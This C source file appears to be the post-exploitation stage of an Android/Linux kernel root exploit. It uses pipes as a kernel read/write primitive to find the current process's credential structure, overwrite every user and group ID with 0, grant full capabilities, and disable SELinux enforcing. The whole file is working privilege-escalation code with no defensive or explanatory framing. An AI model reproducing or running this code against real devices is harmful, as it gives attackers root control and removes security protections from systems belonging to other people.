#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "get_root.h"

#ifndef KERNEL_START
	#ifndef __aarch64__
	#define KERNEL_START 0xc0080000
	#else
	#define KERNEL_START 0xffffffc000080000
	#endif
#endif

#define false 0
#define true 1

int read_pipe,write_pipe;

static int write_kernel(void *target,void *buffer,unsigned size){
	int ret,count = size;
	while(count > 0){
		ret = write(write_pipe,buffer,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	count = size;
	while(count > 0){
		ret = read(read_pipe,target,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	return 0;
}

static int read_kernel(void *target,void *buffer,unsigned size){
	int ret,count = size;
	while(count > 0){
		ret = write(write_pipe,target,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	count = size;
	while(count > 0){
		ret = read(read_pipe,buffer,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	return 0;
}


static void *find_struct_cred_addr(void *task_struct_addr){
	int ret,i;
	struct task_struct *task;
	void *cred_addr = NULL;
	unsigned int size = 0x100*sizeof(size_t);
	int *taskbuf = (int *)malloc(size);
	if(!taskbuf){
		printf("[-]malloc task space failed\n");
		return NULL;
	}
	ret = read_kernel(task_struct_addr,taskbuf,size);
	if(ret == -1)
		printf("[-]copy task struct failed\n");
	else{
		for(i=0;i<size/4;i++){
			task = (struct task_struct *)&taskbuf[i];
			if(task->cpu_timers[0].next == task->cpu_timers[0].prev
				&&(unsigned long)task->cpu_timers[0].next > KERNEL_START
				&&task->cpu_timers[1].next == task->cpu_timers[1].prev
				&&(unsigned long)task->cpu_timers[1].next > KERNEL_START
				&&task->cpu_timers[2].next == task->cpu_timers[2].prev
				&&(unsigned long)task->cpu_timers[2].next > KERNEL_START
				&&task->real_cred == task->cred){
					cred_addr = task->cred;
					break;
			}
		}
	}
	if(cred_addr ==NULL){
		printf("[-]get cred address failed\n");
	}
	else{
		printf("[+]cred address : %p\n",cred_addr);
	}
	free(taskbuf);
	return cred_addr;
}


static int patch_cred(void *cred_addr){
	int ret;
	struct cred *cred = (struct cred*)malloc(sizeof(struct cred)+0x40);
	if(!cred){
		printf("[-]malloc cred failed\n");
		return -1;
	}
	ret = read_kernel(cred_addr,cred,sizeof(struct cred)+0x40);
	if(ret == -1){
		printf("[-]copy cred failed\n");
	}else{
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		cred->cap_inheritable.cap[0] = 0xffffffff;
		cred->cap_inheritable.cap[1] = 0xffffffff;
		cred->cap_permitted.cap[0] = 0xffffffff;
		cred->cap_permitted.cap[1] = 0xffffffff;
		cred->cap_effective.cap[0] = 0xffffffff;
		cred->cap_effective.cap[1] = 0xffffffff;
		cred->cap_bset.cap[0] = 0xffffffff;
		cred->cap_bset.cap[1] = 0xffffffff;
		ret = write_kernel(cred_addr,cred,sizeof(struct cred));//sizeof(struct cred));
		if(ret == -1){
			printf("[-]write cred to kernel stack failed\n");
		}else{
			printf("[+]write cred to kernel stack succuess\n");
		}
	}
	free(cred);
	return ret;
}

static int patch_selinux(void *security_addr){
	int ret;
	struct task_security_struct *security = (struct task_security_struct *)malloc(sizeof(struct task_security_struct));
	security->osid = 1;
	security->sid = 1;
	security->exec_sid = 0;
	security->create_sid = 0;
	security->keycreate_sid = 0;
	security->sockcreate_sid = 0;
	ret = write_kernel(security_addr,security,sizeof(struct task_security_struct));
	if(ret == -1){
		printf("[-]selinux patch failed\n");
	}else{
		printf("[+]selinux patch ok\n");
	}
	return 0;
}

static int patch_selinux2(void *selinux_enforcing,void *selinux_enabled){
	unsigned int value = 0;
	int ret1  = write_kernel(selinux_enforcing,&value,sizeof(int));
	int ret2  = write_kernel(selinux_enabled,&value,4);
	if(ret1 == -1 || ret2 == -1){
		printf("[-]selinux patch failed\n");
	}else{
		printf("[+]selinux patch ok\n");
	}
	return 0;
}

static void *get_stask_struct_addr(struct thread_info_head *thread_info){
	void *task_struct_addr = NULL;
	int ret;
	ret = read_kernel(&thread_info->task,&task_struct_addr,sizeof(struct task_struct *));
	if(ret == -1)
		printf("[-]get stask struct address failed\n");
	else
		printf("[+]task_struct : %p\n",task_struct_addr);
	return task_struct_addr;
}


static int prepare_pipe(){
	int ret;
	int pipe_fd[2];
	ret = pipe(pipe_fd);
	if(ret == -1){
		printf("[-]pipe failed\n");
		return false;
	}
	read_pipe = pipe_fd[0];
	write_pipe = pipe_fd[1];
	return true;
}


int get_root_after_addrlimit_patched(void *_thread_info){
	void *task_struct_addr,*cred_addr;
	struct thread_info_head *thread_info;
	int ret;
	if(!prepare_pipe()){
		return false;
	}
	thread_info = (struct thread_info_head *)_thread_info;
	task_struct_addr = get_stask_struct_addr(thread_info);
	if(!task_struct_addr){
		return false;
	}
	cred_addr = find_struct_cred_addr(task_struct_addr);
	if(!cred_addr){
		return false;
	}
	ret = patch_cred(cred_addr);
	if(ret == -1){
		return false;
	}
	if( getuid() == 0){
		printf("[+]root done\n");
		return true;
	}else{
		printf("[-]root failed\n");
		return false;
	}
}